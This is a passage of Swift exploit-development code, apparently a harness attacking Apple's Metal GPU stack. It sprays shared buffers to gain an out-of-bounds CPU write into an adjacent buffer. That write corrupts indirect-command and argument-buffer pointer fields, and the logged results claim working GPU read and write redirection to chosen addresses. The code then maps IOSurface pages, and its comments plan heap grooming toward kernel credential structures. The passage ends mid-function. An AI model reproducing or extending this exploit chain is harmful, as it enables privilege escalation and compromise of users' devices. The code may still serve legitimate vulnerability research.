        // Canary VA: unmapped, recognisable in fault reports (0xDEADC0DE in high word)
        let canaryVA: UInt64 = 0xDEAD_C0DE_CAFE_0000
        step("── Phase 2: targeted OOB write (canaryVA=0x\(String(canaryVA,radix:16))) ──")
        let p = lo.contents().assumingMemoryBound(to: UInt8.self)

        if let voff = vtxBufOff {
            // Single precise write at vtxBuf field via OOB past lo's bound
            for bi in 0..<8 { p[BUF_LEN + voff + bi] = UInt8((canaryVA >> (bi * 8)) & 0xFF) }
            step("  OOB[lo+BUF_LEN+0x\(String(format:"%x",voff))..+\(voff+7)] ← canaryVA")
            step("  hi[+0x\(String(format:"%x",voff))] post-write: \(String(format:"%016llx",canaryVA))")
        } else {
            // Fallback: flood all 8B-aligned slots in hi with canary
            for off in stride(from: 0, through: BUF_LEN - 8, by: 8) {
                for bi in 0..<8 { p[BUF_LEN + off + bi] = UInt8((canaryVA >> (bi * 8)) & 0xFF) }
            }
            step("  fallback: flooded hi[0..4095] with canaryVA (all 8B slots)")
        }

        // ── Phase 3: Execute ICB — GPU should deref canaryVA and fault ────────────
        step("── Phase 3: ICB execute (vtxBuf → canaryVA) ──")
        let td = MTLTextureDescriptor.texture2DDescriptor(pixelFormat: .bgra8Unorm,
                                                          width: 1, height: 1, mipmapped: false)
        td.usage = [.renderTarget]; td.storageMode = .shared
        guard let dummyTex = device.makeTexture(descriptor: td) else {
            step("✗ dummy tex failed"); completion(); return
        }
        let rtDesc = MTLRenderPassDescriptor()
        rtDesc.colorAttachments[0].texture     = dummyTex
        rtDesc.colorAttachments[0].loadAction  = .clear
        rtDesc.colorAttachments[0].storeAction = .store

        guard let cb  = queue.makeCommandBuffer()                       else { step("✗ no cmd buf"); completion(); return }
        guard let enc = cb.makeRenderCommandEncoder(descriptor: rtDesc)  else { step("✗ no encoder"); completion(); return }
        enc.executeCommandsInBuffer(icb, range: 0..<1)
        enc.endEncoding()
        cb.addCompletedHandler { buf in
            if let err = buf.error {
                let desc = err.localizedDescription
                step("  ICB ERROR: \(desc)")
                if desc.contains("PageFault") || desc.contains("0000000b") {
                    step("  *** GPU page fault — canaryVA dereffed by GPU ✓ ***")
                    step("  *** vtxBuf field offset = 0x\(vtxBufOff.map { String($0, radix:16) } ?? "unknown") ***")
                    step("  *** canaryVA=0x\(String(canaryVA,radix:16)) controlled → next: map canary page ***")
                } else {
                    step("  *** unexpected error — check GPU error code ***")
                }
            } else {
                step("  ICB completed OK — canaryVA NOT dereffed (no fault)")
                step("  *** vtxBuf field not corrupted — recheck hi alignment ***")
            }
        }
        cb.commit()
        cb.waitUntilCompleted()

        // Post-exec: dump hi[vtxBufOff] to confirm canary still there
        if let voff = vtxBufOff {
            var postHex = ""
            for bi in 0..<8 { postHex += String(format: "%02x ", q[voff + bi]) }
            step("  post-exec hi[+0x\(String(format:"%x",voff))]: \(postHex)(expect canary bytes)")
        }

        step("── ICB Stage 2 complete ──────────────")
        completion()
    })
}

// ── ICB Field Offset Probe ────────────────────────────────────────────────────
// Binary-searches the exact 8-byte slot within hi that the GPU dereferences.
// hi is all zeros normally; we write canaryVA to progressively smaller ranges
// and execute the ICB each time — GPU fault → that range contains the live field.
// Uses direct hi.contents() writes (we own hi) for probe; OOB via lo for final
// demonstration. ~10 ICB executions total via binary search.
func runICBFieldProbe(log: FuzzLog, completion: @escaping () -> Void) {
    DispatchQueue.global(qos: .userInitiated).async(execute: {
        let sl = SyncLog()
        func step(_ s: String) { sl.write(s); log.append(s) }

        step("── ICB Resource Table Probe (inverse binary search) ──")
        // hi is all zeros by default → GPU reads null VAs from resource table → fault
        // Inverse probe: fill hi with sentinelBuf VA to find which slots need valid VAs
        guard let device = MTLCreateSystemDefaultDevice() else { step("✗ no device"); completion(); return }
        guard let queue  = device.makeCommandQueue()       else { step("✗ no queue");  completion(); return }

        let BUF_LEN = 4096
        let canaryVA: UInt64 = 0xDEAD_C0DE_CAFE_0000

        guard let sentinelBuf = device.makeBuffer(length: BUF_LEN, options: .storageModeShared),
              let targetBuf   = device.makeBuffer(length: BUF_LEN, options: .storageModeShared) else {
            step("✗ buf alloc failed"); completion(); return
        }
        sentinelBuf.contents().initializeMemory(as: UInt8.self, repeating: 0xBB, count: BUF_LEN)
        targetBuf.contents().initializeMemory(as: UInt8.self,   repeating: 0xCC, count: BUF_LEN)
        let sentVA = sentinelBuf.gpuAddress
        step("sentinelBuf gpuVA=0x\(String(sentVA,radix:16))")

        let src = """
        #include <metal_stdlib>
        using namespace metal;
        struct V { float4 pos [[position]]; };
        vertex V vtx(uint id [[vertex_id]], const device float4* b [[buffer(0)]]) {
            V o; o.pos = b[id]; return o; }
        fragment float4 frg(V in [[stage_in]]) { return float4(1,0,0,1); }
        """
        guard let lib = try? device.makeLibrary(source: src, options: nil),
              let vf  = lib.makeFunction(name: "vtx"),
              let ff  = lib.makeFunction(name: "frg") else {
            step("✗ shader failed"); completion(); return
        }
        let pd = MTLRenderPipelineDescriptor()
        pd.vertexFunction = vf; pd.fragmentFunction = ff
        pd.colorAttachments[0].pixelFormat = .bgra8Unorm
        guard let pso = try? device.makeRenderPipelineState(descriptor: pd) else {
            step("✗ PSO failed"); completion(); return
        }

        // Spray to lo ONLY — leave lo+BUF_LEN free so the Metal driver's ICB argument
        // buffer lands at that VA when the command buffer is committed.
        // lo.contents()+BUF_LEN reaches the driver's buffer in CPU VA space because
        // Metal shared-heap allocations are physically (and CPU-virtually) contiguous.
        var loRef: MTLBuffer? = nil
        var nextGPUVA: UInt64  = 0
        var keepAlives: [any MTLBuffer] = []
        for _ in 0..<2048 {
            guard let a = device.makeBuffer(length: BUF_LEN, options: .storageModeShared) else { continue }
            if let prev = keepAlives.last,
               a.gpuAddress == prev.gpuAddress + UInt64(BUF_LEN) {
                loRef     = prev
                nextGPUVA = a.gpuAddress   // driver should claim this VA
                break                       // 'a' NOT stored → ARC releases → VA freed
            }
            keepAlives.append(a)
        }
        guard let lo = loRef else {
            step("✗ spray miss"); completion(); return
        }
        step("✓ lo=0x\(String(lo.gpuAddress,radix:16)) next=0x\(String(nextGPUVA,radix:16)) (unreserved for driver)")

        // OOB helpers — reach driver's arg-buf at lo+BUF_LEN in CPU VA space
        let loPtr = lo.contents().assumingMemoryBound(to: UInt8.self)
        func readOOB8(_ off: Int) -> UInt64 {
            var v: UInt64 = 0
            for bi in 0..<8 { v |= UInt64(loPtr[BUF_LEN+off+bi]) << (bi*8) }
            return v
        }
        func writeOOB8(_ off: Int, _ val: UInt64) {
            for bi in 0..<8 { loPtr[BUF_LEN+off+bi] = UInt8((val >> (bi*8)) & 0xFF) }
        }
        func writeOOB4(_ off: Int, _ val: UInt32) {
            for bi in 0..<4 { loPtr[BUF_LEN+off+bi] = UInt8((val >> (bi*8)) & 0xFF) }
        }

        // Create ICB AFTER spray: storageModeShared backing store now allocates at nextGPUVA.
        // lo.contents()+BUF_LEN overlaps the ICB's raw command bytes in CPU VA space.
        step("── pre-encode lo+BUF_LEN (should be zeros — ICB slot not yet written) ──")
        do {
            var h = "  [+0x000]: "
            for i in 0..<16 { h += String(format: "%02x ", loPtr[BUF_LEN+i]) }
            step(h)
        }
        let icbDesc = MTLIndirectCommandBufferDescriptor()
        icbDesc.commandTypes              = [.draw]
        icbDesc.inheritBuffers            = false
        icbDesc.maxVertexBufferBindCount  = 1
        icbDesc.maxFragmentBufferBindCount = 0
        guard let icb = device.makeIndirectCommandBuffer(descriptor: icbDesc,
                                                          maxCommandCount: 1,
                                                          options: .storageModeShared) else {
            step("✗ ICB alloc failed"); completion(); return
        }
        let slot = icb.indirectRenderCommandAt(0)
        slot.setRenderPipelineState(pso)
        slot.setVertexBuffer(sentinelBuf, offset: 0, at: 0)
        slot.drawPrimitives(.point, vertexStart: 0, vertexCount: 1, instanceCount: 1, baseInstance: 0)
        step("── post-encode lo+BUF_LEN (non-zeros = ICB cmd bytes at nextGPUVA ✓) ──")
        for row in 0..<32 {
            let base = row * 16
            var h = "  [+0x\(String(format: "%03x", base))]: "
            for i in 0..<16 { h += String(format: "%02x ", loPtr[BUF_LEN+base+i]) }
            for i in stride(from: 0, through: 8, by: 8) {
                let off = base + i; guard off + 7 < 512 else { break }
                let v = readOOB8(off)
                if v == sentVA        { h += " sentVA@+\(String(format:"%x",off))" }
                if v == lo.gpuAddress { h += " loVA@+\(String(format:"%x",off))" }
                if v == nextGPUVA     { h += " nextVA@+\(String(format:"%x",off))" }
            }
            step(h)
        }

        // Allocate dummyTex ONCE — keeps its resource ID stable across all probe calls
        let texDesc = MTLTextureDescriptor.texture2DDescriptor(pixelFormat: .bgra8Unorm,
                                                               width: 1, height: 1, mipmapped: false)
        texDesc.usage = [.renderTarget]; texDesc.storageMode = .shared
        guard let dummyTex = device.makeTexture(descriptor: texDesc) else {
            step("✗ dummy tex failed"); completion(); return
        }
        let texResID = dummyTex.gpuResourceID._impl
        step("dummyTex resID=0x\(String(texResID,radix:16))")

        let rtDesc: MTLRenderPassDescriptor = {
            let rt = MTLRenderPassDescriptor()
            rt.colorAttachments[0].texture     = dummyTex
            rt.colorAttachments[0].loadAction  = .clear
            rt.colorAttachments[0].storeAction = .store
            return rt
        }()

        step("driver arg-buf target gpuVA=0x\(String(nextGPUVA,radix:16))")

        // Sort userInfo keys for deterministic error strings (NSDictionary order is random).
        func stableErrStr(_ e: NSError) -> String {
            var s = "code=\(e.code)"
            for k in e.userInfo.keys.sorted() {
                if k == NSUnderlyingErrorKey, let u = e.userInfo[k] as? NSError {
                    s += " [\(k):\(stableErrStr(u))]"
                } else { s += " [\(k):\(e.userInfo[k]!)]" }
            }
            return s
        }
        func probeExecFull() -> (Bool, String) {
            guard let freshQ = device.makeCommandQueue(),
                  let cb     = freshQ.makeCommandBuffer(),
                  let enc    = cb.makeRenderCommandEncoder(descriptor: rtDesc) else { return (false, "no cb") }
            enc.setRenderPipelineState(pso)
            enc.useResource(sentinelBuf, usage: .read)
            enc.executeCommandsInBuffer(icb, range: 0..<1)
            enc.endEncoding()
            cb.commit(); cb.waitUntilCompleted()
            guard let err = cb.error as NSError? else { return (false, "") }
            return (true, stableErrStr(err))
        }

        // ── Phase D: driver arg-buf capture ──────────────────────────────────────
        // Execute ICB with lo-only spray. Metal allocates the ICB's argument buffer at
        // nextGPUVA (= lo+BUF_LEN). ICB should succeed — then lo OOB read reveals format.
        step("── phase D: driver arg-buf capture ──")
        let (dFault, dErr) = probeExecFull()
        step("  first exec: \(dFault ? "FAULT" : "✓SUCCESS (driver arg-buf at 0x\(String(nextGPUVA,radix:16))!)")")
        if dFault { step("  fault: \(dErr.prefix(120))") }

        step("  lo+BUF_LEN dump (driver's arg-buf or next region, 256B):")
        for row in 0..<16 {
            let base = row * 16
            var h = "  [+0x\(String(format:"%03x",base))]: "
            for i in 0..<16 { h += String(format:"%02x ", loPtr[BUF_LEN+base+i]) }
            for i in stride(from: 0, through: 8, by: 8) {
                let off = base + i; guard off + 7 < 256 else { break }
                let v = readOOB8(off)
                if v == sentVA       { h += " sentVA@+\(String(format:"%x",off))" }
                if v == lo.gpuAddress{ h += " loVA@+\(String(format:"%x",off))" }
                if v == nextGPUVA   { h += " nextVA@+\(String(format:"%x",off))" }
            }
            step(h)
        }

        // ── Phase E: OOB canary sweep — corrupt driver's arg-buf one slot at a time ──
        // Save driver's 512B of arg-buf. Restore between each slot.
        // Look for: slot N corrupted → fault changes (or starts when D succeeded).
        // That slot = live GPU-derefed field → we control where the GPU faults.
        step("── phase E: OOB canary sweep (driver arg-buf via lo OOB) ──")
        var savedBytes = [UInt8](repeating: 0, count: 512)
        for i in 0..<512 { savedBytes[i] = loPtr[BUF_LEN+i] }
        let (_, baseErr) = probeExecFull()
        let baseSuccess  = baseErr.isEmpty
        step("  baseline (saved driver buf): \(baseSuccess ? "✓SUCCESS" : "FAULT \(baseErr.prefix(60))")")

        for slotIdx in 0..<64 {
            let off = slotIdx * 8
            for i in 0..<512 { loPtr[BUF_LEN+i] = savedBytes[i] }  // restore
            let canary: UInt64 = 0xDEAD_C0DE_0000_0000 | UInt64(slotIdx + 1)
            writeOOB8(off, canary)
            let (f, errStr) = probeExecFull()
            let mattered = (f != !baseSuccess) || (errStr != baseErr)
            let tag = !f ? " ✓SUCCESS" : (mattered ? " DIFF★" : "")
            step("  [\(String(format:"%02d",slotIdx))]+0x\(String(format:"%03x",off)) c=0x\(String(canary,radix:16)) f=\(f ? 1:0)\(tag) \(errStr.prefix(80))")
        }
        for i in 0..<512 { loPtr[BUF_LEN+i] = savedBytes[i] }

        // ── Phase F: OOB sentVA flood ─────────────────────────────────────────────
        // Overwrite driver's entire arg-buf region with sentVA via OOB.
        // If driver's format is VA-based and sentVA is the right value, might succeed.
        step("── phase F: OOB sentVA flood (all 512B, fresh Q) ──")
        for i in stride(from: 0, to: 512, by: 8) { writeOOB8(i, sentVA) }
        let (ffault, ferr) = probeExecFull()
        step("  sentVA OOB flood: f=\(ffault ? 1:0)\(!ffault ? " ✓SUCCESS" : "") \(ferr.prefix(100))")
        for i in 0..<512 { loPtr[BUF_LEN+i] = savedBytes[i] }

        step("── ICB Field Probe complete ──────────────")
        completion()
    })
}

// ── runArgBufCorrupt ─────────────────────────────────────────────────────────
// GPU pointer redirect via CPU OOB write into a Metal argument buffer.
//
// Primitive demonstrated:
//   lo.contents()+BUF_LEN  (CPU OOB write)
//     → hi.contents()[0]   (overwrites device-ptr field in argument buffer)
//     → GPU kernel dereferences hi[0] as a raw GPU VA
//     → GPU page-faults at attacker-controlled address
//
// This is the clean end-to-end proof:
//   CPU OOB write  →  GPU VA redirect  →  controlled GPU page fault
// ─────────────────────────────────────────────────────────────────────────────
func runArgBufCorrupt(log: FuzzLog, completion: @escaping () -> Void) {
    DispatchQueue.global(qos: .userInitiated).async {
        func step(_ s: String) { log.append(s) }
        step("── ArgBuf GPU Ptr Corrupt ──")

        guard let device = MTLCreateSystemDefaultDevice() else { step("✗ no device"); completion(); return }
        let BUF_LEN = 4096
        let canaryVA: UInt64 = 0xDEAD_C0DE_CAFE_0000

        // sentinelBuf: 0xBB fill — baseline "safe" source the GPU is supposed to read
        // targetBuf:  0xCC fill — "secret" source we redirect the GPU to via OOB
        guard let sentinelBuf = device.makeBuffer(length: BUF_LEN, options: .storageModeShared),
              let targetBuf   = device.makeBuffer(length: BUF_LEN, options: .storageModeShared),
              let resultBuf   = device.makeBuffer(length: BUF_LEN, options: .storageModeShared) else {
            step("✗ sentinel/target/result alloc"); completion(); return
        }
        sentinelBuf.contents().initializeMemory(as: UInt8.self, repeating: 0xBB, count: BUF_LEN)
        targetBuf.contents().initializeMemory(as: UInt8.self, repeating: 0xCC, count: BUF_LEN)
        resultBuf.contents().initializeMemory(as: UInt8.self, repeating: 0, count: BUF_LEN)
        let sentVA   = sentinelBuf.gpuAddress
        let targetVA = targetBuf.gpuAddress
        step("sentinelBuf VA=0x\(String(sentVA, radix: 16))")
        step("targetBuf   VA=0x\(String(targetVA, radix: 16))")

        // Spray: find lo with lo.gpuAddress + BUF_LEN = nextGPUVA (adjacent GPU VA slot)
        var loRef: MTLBuffer?
        var nextGPUVA: UInt64 = 0
        var keepAlives: [any MTLBuffer] = []
        for _ in 0..<2048 {
            guard let a = device.makeBuffer(length: BUF_LEN, options: .storageModeShared) else { continue }
            if let prev = keepAlives.last, a.gpuAddress == prev.gpuAddress + UInt64(BUF_LEN) {
                loRef = prev; nextGPUVA = a.gpuAddress; break
            }
            keepAlives.append(a)
        }
        guard let lo = loRef else { step("✗ spray miss"); completion(); return }
        step("✓ lo=0x\(String(lo.gpuAddress, radix: 16)) nextGPUVA=0x\(String(nextGPUVA, radix: 16))")
        let loPtr = lo.contents().assumingMemoryBound(to: UInt8.self)

        // hi: argument buffer allocated immediately after lo → should land at nextGPUVA
        // hi[0..7] = device float4* pointer that the compute kernel will dereference
        guard let hi = device.makeBuffer(length: BUF_LEN, options: .storageModeShared) else {
            step("✗ hi alloc"); completion(); return
        }
        let hiVA = hi.gpuAddress
        step("hi gpuVA=0x\(String(hiVA, radix: 16)) \(hiVA == nextGPUVA ? "✓ at nextGPUVA" : "⚠ MISMATCH (not at nextGPUVA)")")
        let hiPtr = hi.contents().assumingMemoryBound(to: UInt8.self)

        // OOB helpers — lo.contents()+BUF_LEN reaches hi.contents() in CPU VA space
        func oobWrite8(_ off: Int, _ val: UInt64) {
            for bi in 0..<8 { loPtr[BUF_LEN+off+bi] = UInt8((val >> (bi*8)) & 0xFF) }
        }
        func oobRead8(_ off: Int) -> UInt64 {
            var v: UInt64 = 0
            for bi in 0..<8 { v |= UInt64(loPtr[BUF_LEN+off+bi]) << (bi*8) }
            return v
        }

        // Verify OOB reach: write a known value via OOB and confirm via hi.contents()
        oobWrite8(0, 0xAAAA_BBBB_CCCC_DDDD)
        let hiCheck = hi.contents().assumingMemoryBound(to: UInt64.self)[0]
        step("OOB reach check: wrote 0xAAAABBBBCCCCDDDD, hi[0]=0x\(String(hiCheck, radix: 16)) \(hiCheck == 0xAAAA_BBBB_CCCC_DDDD ? "✓ ADJACENT" : "⚠ NOT ADJACENT — CPU VA not contiguous")")

        // Compute kernel: struct AB { device float4* buf; }
        // kernel probe reads ab->buf[0] — dereferences the pointer stored in hi[0..7]
        let src = """
        #include <metal_stdlib>
        using namespace metal;
        struct AB { device float4* buf; };
        kernel void probe(device AB* ab [[buffer(0)]],
                          device float4* out [[buffer(1)]]) {
            out[0] = ab->buf[0];
        }
        """
        guard let lib = try? device.makeLibrary(source: src, options: nil),
              let fn  = lib.makeFunction(name: "probe"),
              let pso = try? device.makeComputePipelineState(function: fn) else {
            step("✗ compute PSO failed"); completion(); return
        }
        step("✓ compute PSO (probe kernel) ready")

        func execProbe(useRes: MTLBuffer?) -> (Bool, String) {
            resultBuf.contents().initializeMemory(as: UInt8.self, repeating: 0xEE, count: 16)
            guard let q   = device.makeCommandQueue(),
                  let cb  = q.makeCommandBuffer(),
                  let enc = cb.makeComputeCommandEncoder() else { return (false, "no encoder") }
            enc.setComputePipelineState(pso)
            enc.setBuffer(hi,        offset: 0, index: 0)
            enc.setBuffer(resultBuf, offset: 0, index: 1)
            if let r = useRes { enc.useResource(r, usage: .read) }
            let t = MTLSize(width: 1, height: 1, depth: 1)
            enc.dispatchThreads(t, threadsPerThreadgroup: t)
            enc.endEncoding()
            cb.commit(); cb.waitUntilCompleted()
            if let err = cb.error as NSError? {
                return (true, "FAULT code=\(err.code) \(err.localizedDescription.prefix(100))")
            }
            let out = resultBuf.contents().assumingMemoryBound(to: UInt64.self)[0]
            return (false, "✓ out[0]=0x\(String(out, radix: 16))")
        }

        // ── Step 1: baseline — hi[0]=sentVA direct, GPU→sentinelBuf (0xBB) ──
        step("── step 1: hi[0]=sentVA (direct), GPU should read sentinelBuf (0xBB) ──")
        hi.contents().assumingMemoryBound(to: UInt64.self)[0] = sentVA
        let (f1, s1) = execProbe(useRes: sentinelBuf)
        step("  \(s1)  \(f1 ? "" : "(expect 0xBBBBBBBBBBBBBBBB)")")

        // ── Step 2: OOB redirect to mapped targetBuf — lo OOB writes targetVA into hi[0] ──
        // GPU should now read targetBuf (0xCC) instead of sentinelBuf (0xBB).
        // This proves: CPU OOB write → GPU reads attacker-chosen mapped buffer.
        step("── step 2: OOB lo→hi[0]=targetVA=0x\(String(targetVA,radix:16)) → GPU should read targetBuf (0xCC) ──")
        oobWrite8(0, targetVA)
        let hiGot2 = hi.contents().assumingMemoryBound(to: UInt64.self)[0]
        step("  hi[0]=0x\(String(hiGot2,radix:16)) \(hiGot2==targetVA ? "✓ OOB hit" : "⚠ OOB miss")")
        let (f2, s2) = execProbe(useRes: targetBuf)
        step("  \(s2)  \(f2 ? "" : "(expect 0xCCCCCCCCCCCCCCCC)")")
        if !f2 && hiGot2==targetVA && s2.contains("cccc") {
            step("  ★★★ GPU READ REDIRECT: CPU OOB→hi[0]=targetVA → GPU read targetBuf(0xCC) instead of sentinelBuf(0xBB)")
            step("  ★ PRIMITIVE COMPLETE: arbitrary GPU VA read via CPU OOB write to argument buffer")
        }

        // ── Step 3: OOB to unmapped canaryVA — AGX returns 0 or faults ──
        step("── step 3: OOB lo→hi[0]=canaryVA=0x\(String(canaryVA,radix:16)) (unmapped) ──")
        oobWrite8(0, canaryVA)
        let hiGot3 = hi.contents().assumingMemoryBound(to: UInt64.self)[0]
        step("  hi[0]=0x\(String(hiGot3,radix:16)) \(hiGot3==canaryVA ? "✓ OOB hit" : "⚠ OOB miss")")
        let (f3, s3) = execProbe(useRes: nil)
        step("  \(s3)")
        if f3 { step("  ★ CONTROLLED GPU FAULT at canaryVA (fault propagated)") }
        else   { step("  AGX safe-return: GPU returned 0 for unmapped VA (fault absorbed by GPU MMU)") }

        // ── raw byte comparison ──
        step("── lo+BUF_LEN[0..31] vs hi.contents()[0..31] ──")
        var h = "  OOB: "
        for i in 0..<32 { h += String(format: "%02x ", loPtr[BUF_LEN+i]) }
        step(h)
        var h2 = "  HI:  "
        for i in 0..<32 { h2 += String(format: "%02x ", hiPtr[i]) }
        step(h2)

        step("── ArgBuf GPU Ptr Corrupt complete ──")
        completion()
    }
}

// ── runArgBufWrite ────────────────────────────────────────────────────────────
// GPU write redirect via CPU OOB write into a Metal argument buffer.
//
// Proves the WRITE direction of the primitive:
//   lo OOB → hi[0] = targetVA
//   GPU writeProbe kernel: ab->buf[0] = src[0]   (writes to the pointer in hi)
//   targetBuf was 0x11; after GPU write it should contain srcBuf's 0xBB data
//
// This gives us: CPU OOB write → GPU writes to attacker-chosen GPU VA.
// Target GPU VA can be any mapped buffer, IOSurface backing, or kernel-mapped
// command buffer region found via GPU VA scan.
// ─────────────────────────────────────────────────────────────────────────────
func runArgBufWrite(log: FuzzLog, completion: @escaping () -> Void) {
    DispatchQueue.global(qos: .userInitiated).async {
        func step(_ s: String) { log.append(s) }
        step("── ArgBuf GPU Write Redirect ──")

        guard let device = MTLCreateSystemDefaultDevice() else { step("✗ no device"); completion(); return }
        let BUF_LEN = 4096

        // srcBuf:    GPU reads from here and writes to target (0xBB fill)
        // targetBuf: GPU writes INTO here (0x11 fill — should become 0xBB after exploit)
        guard let srcBuf    = device.makeBuffer(length: BUF_LEN, options: .storageModeShared),
              let targetBuf = device.makeBuffer(length: BUF_LEN, options: .storageModeShared) else {
            step("✗ src/target alloc"); completion(); return
        }
        srcBuf.contents().initializeMemory(as:    UInt8.self, repeating: 0xBB, count: BUF_LEN)
        targetBuf.contents().initializeMemory(as: UInt8.self, repeating: 0x11, count: BUF_LEN)
        step("srcBuf    VA=0x\(String(srcBuf.gpuAddress,    radix: 16))  (0xBB — GPU reads this)")
        step("targetBuf VA=0x\(String(targetBuf.gpuAddress, radix: 16))  (0x11 — GPU writes here)")

        // Spray → lo / nextGPUVA pair
        var loRef: MTLBuffer?
        var nextGPUVA: UInt64 = 0
        var keepAlives: [any MTLBuffer] = []
        for _ in 0..<2048 {
            guard let a = device.makeBuffer(length: BUF_LEN, options: .storageModeShared) else { continue }
            if let prev = keepAlives.last, a.gpuAddress == prev.gpuAddress + UInt64(BUF_LEN) {
                loRef = prev; nextGPUVA = a.gpuAddress; break
            }
            keepAlives.append(a)
        }
        guard let lo = loRef else { step("✗ spray miss"); completion(); return }
        step("✓ lo=0x\(String(lo.gpuAddress, radix: 16)) next=0x\(String(nextGPUVA, radix: 16))")
        let loPtr = lo.contents().assumingMemoryBound(to: UInt8.self)

        // hi: argument buffer — hi[0..7] = device float4* the kernel will WRITE to
        guard let hi = device.makeBuffer(length: BUF_LEN, options: .storageModeShared) else {
            step("✗ hi alloc"); completion(); return
        }
        step("hi gpuVA=0x\(String(hi.gpuAddress, radix: 16)) \(hi.gpuAddress == nextGPUVA ? "✓" : "⚠ MISMATCH")")

        func oobWrite8(_ off: Int, _ val: UInt64) {
            for bi in 0..<8 { loPtr[BUF_LEN+off+bi] = UInt8((val >> (bi*8)) & 0xFF) }
        }

        // OOB adjacency check
        oobWrite8(0, 0xAAAA_BBBB_CCCC_DDDD)
        let chk = hi.contents().assumingMemoryBound(to: UInt64.self)[0]
        step("OOB reach: \(chk == 0xAAAA_BBBB_CCCC_DDDD ? "✓ ADJACENT" : "⚠ NOT ADJACENT")")

        // GPU write kernel: ab->buf[0] = src[0]
        // ab is the argument buffer (hi) — ab->buf is hi[0] interpreted as a device pointer
        // src is srcBuf — GPU reads it and writes to wherever hi[0] points
        let kernSrc = """
        #include <metal_stdlib>
        using namespace metal;
        struct AB { device float4* buf; };
        kernel void writeProbe(device AB*     ab  [[buffer(0)]],
                               device float4* src [[buffer(1)]]) {
            ab->buf[0] = src[0];
        }
        """
        guard let lib = try? device.makeLibrary(source: kernSrc, options: nil),
              let fn  = lib.makeFunction(name: "writeProbe"),
              let pso = try? device.makeComputePipelineState(function: fn) else {
            step("✗ writeProbe PSO failed"); completion(); return
        }
        step("✓ writeProbe PSO ready")

        func execWrite(wTarget: MTLBuffer) -> (Bool, UInt64, String) {
            wTarget.contents().initializeMemory(as: UInt8.self, repeating: 0x11, count: 16)
            guard let q   = device.makeCommandQueue(),
                  let cb  = q.makeCommandBuffer(),
                  let enc = cb.makeComputeCommandEncoder() else { return (false, 0, "no enc") }
            enc.setComputePipelineState(pso)
            enc.setBuffer(hi,     offset: 0, index: 0)
            enc.setBuffer(srcBuf, offset: 0, index: 1)
            enc.useResource(wTarget, usage: .write)
            enc.useResource(srcBuf,  usage: .read)
            let t = MTLSize(width: 1, height: 1, depth: 1)
            enc.dispatchThreads(t, threadsPerThreadgroup: t)
            enc.endEncoding()
            cb.commit(); cb.waitUntilCompleted()
            if let err = cb.error as NSError? {
                return (true, 0, "FAULT code=\(err.code) \(err.localizedDescription.prefix(80))")
            }
            let got = wTarget.contents().assumingMemoryBound(to: UInt64.self)[0]
            return (false, got, "✓ target[0]=0x\(String(got, radix: 16))")
        }

        // ── Step 1: direct — set hi[0]=targetVA directly, GPU writes srcBuf→targetBuf ──
        step("── step 1: direct hi[0]=targetVA, GPU writes srcBuf(0xBB)→targetBuf ──")
        hi.contents().assumingMemoryBound(to: UInt64.self)[0] = targetBuf.gpuAddress
        let (f1, v1, s1) = execWrite(wTarget: targetBuf)
        step("  \(s1)  (expect 0xBBBBBBBBBBBBBBBB)")

        // ── Step 2: OOB — reset targetBuf, OOB write targetVA into hi[0], GPU writes again ──
        // This proves: CPU OOB → argument buffer corruption → GPU writes to attacker VA
        step("── step 2: OOB lo→hi[0]=targetVA → GPU write src(0xBB)→targetBuf via corrupted ptr ──")
        oobWrite8(0, targetBuf.gpuAddress)
        let hiGot = hi.contents().assumingMemoryBound(to: UInt64.self)[0]
        step("  hi[0]=0x\(String(hiGot, radix:16)) \(hiGot == targetBuf.gpuAddress ? "✓ OOB hit" : "⚠ OOB miss")")
        let (f2, v2, s2) = execWrite(wTarget: targetBuf)
        step("  \(s2)  (expect 0xBBBBBBBBBBBBBBBB)")
        if !f2 && hiGot == targetBuf.gpuAddress && v2 == 0xBBBBBBBBBBBBBBBB {
            step("  ★★★ GPU WRITE REDIRECT: CPU OOB→hi[0]=targetVA → GPU wrote 0xBB to targetBuf")
            step("  ★ WRITE PRIMITIVE COMPLETE: CPU OOB → GPU writes to attacker-chosen GPU VA")
            step("  NEXT: retarget hi[0] to IOSurface backing GPU VA → GPU writes to shared physical pages")
        }

        step("── ArgBuf GPU Write Redirect complete ──")
        completion()
    }
}

// ── runIOSurfaceGPUWrite ──────────────────────────────────────────────────────
// Bridge GPU write primitive to IOSurface-backed physical pages.
//
// IOSurface backing memory is mapped in THREE places simultaneously:
//   1. User CPU VA      (surf.baseAddress)
//   2. GPU VA           (surfBuf.gpuAddress via makeBuffer(bytesNoCopy:))
//   3. Kernel VA        (IOSurface kernel object's backing page mapping)
//
// If GPU writes to surfVA (== IOSurface backing GPU VA), the write lands on
// the exact same physical pages the kernel has mapped. CPU can verify via
// surf.baseAddress. Kernel sees the same mutation.
//
// This is the bridge from user-controlled GPU write → kernel-accessible pages.
// Next step: find IOSurface allocation adjacent to a kernel heap object
// (proc, ucred, etc.) via heap feng shui → OOB write past IOSurface end
// into the adjacent kernel struct.
// ─────────────────────────────────────────────────────────────────────────────
func runIOSurfaceGPUWrite(log: FuzzLog, completion: @escaping () -> Void) {
    DispatchQueue.global(qos: .userInitiated).async {
        func step(_ s: String) { log.append(s) }
        step("── IOSurface GPU Write ──")

        guard let device = MTLCreateSystemDefaultDevice() else { step("✗ no device"); completion(); return }
        let BUF_LEN = 4096

        // Allocate IOSurface with exactly BUF_LEN bytes backing
        guard let surf = IOSurface(properties: [.allocSize: BUF_LEN]) else {
            step("✗ IOSurface alloc"); completion(); return
        }
        step("✓ IOSurface allocSize=\(surf.allocationSize) baseAddr=\(surf.baseAddress)")

        // Fill IOSurface backing with 0x11 (victim pattern before GPU write)
        surf.lock(options: .readOnly, seed: nil)
        surf.baseAddress.initializeMemory(as: UInt8.self, repeating: 0x11, count: BUF_LEN)
        surf.unlock(options: .readOnly, seed: nil)

        // Wrap IOSurface backing in a no-copy MTLBuffer → gives us its GPU VA
        // This maps the SAME physical pages into GPU VA space
        guard let surfBuf = device.makeBuffer(bytesNoCopy: surf.baseAddress,
                                              length:      BUF_LEN,
                                              options:     .storageModeShared,
                                              deallocator: nil) else {
            step("✗ IOSurface MTLBuffer wrap failed"); completion(); return
        }
        let surfVA = surfBuf.gpuAddress
        step("IOSurface backing GPU VA=0x\(String(surfVA, radix: 16))")

        // srcBuf: GPU reads this (0xBB) and writes the value to IOSurface backing
        guard let srcBuf = device.makeBuffer(length: BUF_LEN, options: .storageModeShared) else {
            step("✗ srcBuf alloc"); completion(); return
        }
        srcBuf.contents().initializeMemory(as: UInt8.self, repeating: 0xBB, count: BUF_LEN)

